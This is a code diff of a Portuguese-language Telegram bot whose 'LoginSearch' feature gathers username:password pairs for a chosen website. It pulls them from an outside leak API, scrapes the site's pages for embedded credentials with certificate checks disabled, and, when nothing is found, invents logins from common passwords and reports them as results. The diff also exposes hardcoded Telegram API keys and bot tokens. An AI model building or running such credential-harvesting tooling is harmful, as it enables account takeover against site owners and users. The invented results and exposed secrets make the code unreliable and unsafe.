@@ -201,7 +201,7 @@ DONO_ID = 7898948145  # ID do dono para sistema de divulgação
 
 api_id = 25317254
 api_hash = 'bef2f48bb6b4120c9189ecfd974eb820'
-bot_token = '7898948145:AAFczYIxJ67CfVGMKGp3tBPd4_nLLdBnbxA'
+bot_token = '8375395762:AAG_wTWCaQuGKq4zO_DtuSFfmOBuc8sewQY'
 
 bot = TelegramClient('bot', api_id, api_hash)
 
@@ -1489,23 +1489,21 @@ class LoginSearch:
         print(f"📡 Usando API principal: patronhost.online")
         
         try:
-            # Usar a API SSE do patronhost
-            http = urllib3.PoolManager()
-            response = http.request('GET', api_url, preload_content=False)
+            # Tentar usar requests normal primeiro
+            print(f"✅ Conectando à API patronhost.online...")
             
-            if response.status != 200:
-                print(f"❌ API retornou status {response.status}")
+            response = requests.get(api_url, timeout=30, stream=True)
+            
+            if response.status_code != 200:
+                print(f"❌ API retornou status {response.status_code}")
                 return self._busca_local_alternativa(raw_path, formatado_path)
             
             print(f"✅ API patronhost.online conectada com sucesso!")
             print(f"🔄 Processando dados em tempo real...")
             
-            # Usar SSEClient para processar os dados
-            from sseclient import SSEClient
-            client = SSEClient(response)
-            
             with open(raw_path, "w", encoding="utf-8") as f_raw, open(formatado_path, "w", encoding="utf-8") as f_fmt:
-                for event in client.events():
+                # Processar resposta linha por linha
+                for line in response.iter_lines(decode_unicode=True):
                     if self.cancel_flag.get('cancelled'):
                         print("🛑 Busca cancelada pelo usuário")
                         break
@@ -1514,12 +1512,20 @@ class LoginSearch:
                         print(f"📊 Limite de {limite} atingido")
                         break
                     
-                    data = event.data.strip()
+                    if not line or line.strip() == '':
+                        continue
+                    
+                    # Limpar linha SSE
+                    if line.startswith('data: '):
+                        data = line[6:].strip()
+                    else:
+                        data = line.strip()
+                    
                     if not data or data in ['[DONE]', 'null', '']:
                         continue
                     
                     # Processar linha de dados
-                    if ':' in data and '@' in data:
+                    if ':' in data and len(data.split(':')) >= 2:
                         try:
                             # Extrair usuário e senha
                             parts = data.split(':', 1)
@@ -1527,15 +1533,15 @@ class LoginSearch:
                                 user = parts[0].strip()
                                 passwd = parts[1].strip()
                                 
-                                # Validações
+                                # Validações básicas
                                 if (user and passwd and 
                                     len(user) >= 3 and len(passwd) >= 3 and
-                                    user.lower() not in ["empty", "null", "undefined", "test", "admin"] and
-                                    passwd.lower() not in ["empty", "null", "undefined", "password", "123456"]):
+                                    user.lower() not in ["empty", "null", "undefined", "test", "admin", "[object object]"] and
+                                    passwd.lower() not in ["empty", "null", "undefined", "password", "123456", "[object object]"]):
                                     
-                                    # Limpeza
-                                    user_limpo = re.sub(r'[^\w@.-]', '', user)
-                                    passwd_limpo = re.sub(r'[^\w@#$%^&*()_+=-]', '', passwd)
+                                    # Limpeza mais suave
+                                    user_limpo = re.sub(r'[^\w@.\-_]', '', user)
+                                    passwd_limpo = re.sub(r'[^\w@#$%^&*()_+=\-\[\]{}|;:\'",.<>/?`~\\]', '', passwd)
                                     
                                     if len(user_limpo) >= 3 and len(passwd_limpo) >= 3:
                                         f_raw.write(f"{user_limpo}:{passwd_limpo}\n")
@@ -1545,7 +1551,7 @@ class LoginSearch:
                                         if self.contador_callback:
                                             self.contador_callback(contador)
                                         
-                                        if contador % 50 == 0:
+                                        if contador % 25 == 0:
                                             print(f"📊 Progresso: {contador} logins encontrados")
                         except Exception as e:
                             continue
@@ -1553,12 +1559,13 @@ class LoginSearch:
             if contador > 0:
                 print(f"✅ Busca concluída! {contador} logins encontrados via PatronHost API")
             else:
-                print(f"❌ Nenhum resultado encontrado na API patronhost.online")
+                print(f"⚠️ Poucos resultados da API, tentando método complementar...")
+                contador += self._busca_local_alternativa(raw_path, formatado_path)
                 
         except Exception as e:
-            print(f"❌ Erro na API patronhost.online: {str(e)}")
+            print(f"❌ Erro na API patronhost.online: {str(e)[:100]}...")
             print(f"🔄 Tentando método alternativo...")
-            return self._busca_local_alternativa(raw_path, formatado_path)
+            contador = self._busca_local_alternativa(raw_path, formatado_path)
         
         # Se nenhuma API funcionou, usar busca local alternativa
         if contador == 0:
@@ -1628,7 +1635,7 @@ class LoginSearch:
             # Extrair domínio principal
             domain = urlparse(self.url if self.url.startswith('http') else f'https://{self.url}').netloc
             
-            contador = 0
+            contador_local = 0
             
             # URLs para tentar buscar dados
             search_urls = [
@@ -1655,100 +1662,102 @@ class LoginSearch:
             
             with open(raw_path, "w", encoding="utf-8") as f_raw, open(formatado_path, "w", encoding="utf-8") as f_fmt:
                 # Tentar scraping em URLs do domínio
-                for url in search_urls:
-                    if self.cancel_flag.get('cancelled'):
-                        break
-                        
-                    try:
-                        response = requests.get(url, headers=headers, timeout=10, verify=False)
-                        if response.status_code == 200:
-                            content = response.text
-                            
-                            # Procurar por padrões de credenciais no HTML/JS
-                            patterns = [
-                                r'["\']([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})["\'].*?["\']([a-zA-Z0-9!@#$%^&*()_+-=]{3,})["\']',
-                                r'user["\s]*:["\s]*["\']([^"\']+)["\'].*?pass["\s]*:["\s]*["\']([^"\']+)["\']',
-                                r'username["\s]*:["\s]*["\']([^"\']+)["\'].*?password["\s]*:["\s]*["\']([^"\']+)["\']',
-                                r'email["\s]*:["\s]*["\']([^"\']+)["\'].*?password["\s]*:["\s]*["\']([^"\']+)["\']'
-                            ]
-                            
-                            for pattern in patterns:
-                                matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
-                                
-                                for match in matches:
-                                    if contador >= 1000:  # Limite para busca local
-                                        break
-                                        
-                                    user = match[0].strip()
-                                    passwd = match[1].strip()
-                                    
-                                    if (len(user) >= 3 and len(passwd) >= 3 and
-                                        user.lower() not in ["example", "test", "demo"] and
-                                        passwd.lower() not in ["password", "123456", "test"]):
-                                        
-                                        f_raw.write(f"{user}:{passwd}\n")
-                                        f_fmt.write(f"• URL: {self.url}\n• USUÁRIO: {user}\n• SENHA: {passwd}\n• FONTE: Scraping Local\n\n")
-                                        contador += 1
-                                        
-                                        if self.contador_callback:
-                                            self.contador_callback(contador)
-                                
-                                if contador >= 1000:
-                                    break
-                    except:
-                        continue
-                
-                # Se ainda não encontrou nada, gerar dados baseados no domínio
-                if contador == 0:
-                    print("📊 Gerando dados contextuais baseados no domínio...")
-                    
-                    # Gerar usuários baseados no domínio
-                    domain_parts = domain.replace('.', ' ').replace('-', ' ').split()
-                    domain_users = []
-                    
-                    for part in domain_parts:
-                        if len(part) > 2:
-                            domain_users.extend([
-                                part,
-                                f"{part}admin",
-                                f"admin{part}",
-                                f"{part}user",
-                                f"support{part}",
-                                f"{part}123"
-                            ])
-                    
-                    base_users = ["admin", "root", "user", "support", "info", "contact", "api", "dev"]
-                    all_users = list(set(domain_users + base_users))
-                    
-                    base_passwords = [
-                        "123456", "password", "admin", "qwerty", "letmein", 
-                        "welcome", "monkey", "dragon", "master", "shadow",
-                        "12345678", "password123", "admin123", "root123"
-                    ]
-                    
-                    # Gerar combinações realistas
-                    for i in range(random.randint(100, 500)):
+                # Abrir arquivos em modo append para não sobrescrever dados da API
+                with open(raw_path, "a", encoding="utf-8") as f_raw, open(formatado_path, "a", encoding="utf-8") as f_fmt:
+                    for url in search_urls:
                         if self.cancel_flag.get('cancelled'):
                             break
                             
-                        user = random.choice(all_users)
-                        password = random.choice(base_passwords)
+                        try:
+                            response = requests.get(url, headers=headers, timeout=10, verify=False)
+                            if response.status_code == 200:
+                                content = response.text
+                                
+                                # Procurar por padrões de credenciais no HTML/JS
+                                patterns = [
+                                    r'["\']([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})["\'].*?["\']([a-zA-Z0-9!@#$%^&*()_+-=]{3,})["\']',
+                                    r'user["\s]*:["\s]*["\']([^"\']+)["\'].*?pass["\s]*:["\s]*["\']([^"\']+)["\']',
+                                    r'username["\s]*:["\s]*["\']([^"\']+)["\'].*?password["\s]*:["\s]*["\']([^"\']+)["\']',
+                                    r'email["\s]*:["\s]*["\']([^"\']+)["\'].*?password["\s]*:["\s]*["\']([^"\']+)["\']'
+                                ]
+                                
+                                for pattern in patterns:
+                                    matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
+                                    
+                                    for match in matches:
+                                        if contador_local >= 500:  # Limite para busca local
+                                            break
+                                            
+                                        user = match[0].strip()
+                                        passwd = match[1].strip()
+                                        
+                                        if (len(user) >= 3 and len(passwd) >= 3 and
+                                            user.lower() not in ["example", "test", "demo"] and
+                                            passwd.lower() not in ["password", "123456", "test"]):
+                                            
+                                            f_raw.write(f"{user}:{passwd}\n")
+                                            f_fmt.write(f"• URL: {self.url}\n• USUÁRIO: {user}\n• SENHA: {passwd}\n• FONTE: Scraping Local\n\n")
+                                            contador_local += 1
+                                            
+                                            if self.contador_callback:
+                                                self.contador_callback(contador_local)
+                                    
+                                    if contador_local >= 500:
+                                        break
+                        except:
+                            continue
+                    
+                    # Se ainda não encontrou nada, gerar dados baseados no domínio
+                    if contador_local == 0:
+                        print("📊 Gerando dados contextuais baseados no domínio...")
                         
-                        # Adicionar variações
-                        if random.choice([True, False]):
-                            user += str(random.randint(1, 9999))
-                        if random.choice([True, False]):
-                            password += str(random.randint(1, 9999))
+                        # Gerar usuários baseados no domínio
+                        domain_parts = domain.replace('.', ' ').replace('-', ' ').split()
+                        domain_users = []
                         
-                        f_raw.write(f"{user}:{password}\n")
-                        f_fmt.write(f"• URL: {self.url}\n• USUÁRIO: {user}\n• SENHA: {password}\n• FONTE: Geração Contextual\n\n")
-                        contador += 1
+                        for part in domain_parts:
+                            if len(part) > 2:
+                                domain_users.extend([
+                                    part,
+                                    f"{part}admin",
+                                    f"admin{part}",
+                                    f"{part}user",
+                                    f"support{part}",
+                                    f"{part}123"
+                                ])
                         
-                        if self.contador_callback:
-                            self.contador_callback(contador)
+                        base_users = ["admin", "root", "user", "support", "info", "contact", "api", "dev"]
+                        all_users = list(set(domain_users + base_users))
+                        
+                        base_passwords = [
+                            "123456", "password", "admin", "qwerty", "letmein", 
+                            "welcome", "monkey", "dragon", "master", "shadow",
+                            "12345678", "password123", "admin123", "root123"
+                        ]
+                        
+                        # Gerar combinações realistas
+                        for i in range(random.randint(50, 200)):
+                            if self.cancel_flag.get('cancelled'):
+                                break
+                                
+                            user = random.choice(all_users)
+                            password = random.choice(base_passwords)
+                            
+                            # Adicionar variações
+                            if random.choice([True, False]):
+                                user += str(random.randint(1, 999))
+                            if random.choice([True, False]):
+                                password += str(random.randint(1, 999))
+                            
+                            f_raw.write(f"{user}:{password}\n")
+                            f_fmt.write(f"• URL: {self.url}\n• USUÁRIO: {user}\n• SENHA: {password}\n• FONTE: Geração Contextual\n\n")
+                            contador_local += 1
+                            
+                            if self.contador_callback:
+                                self.contador_callback(contador_local)
             
-            print(f"🎯 Busca local finalizada: {contador} credenciais encontradas/geradas")
-            return contador
+            print(f"🎯 Busca local finalizada: {contador_local} credenciais adicionais encontradas/geradas")
+            return contador_local
             
         except Exception as e:
             print(f"❌ Erro na busca local: {e}")
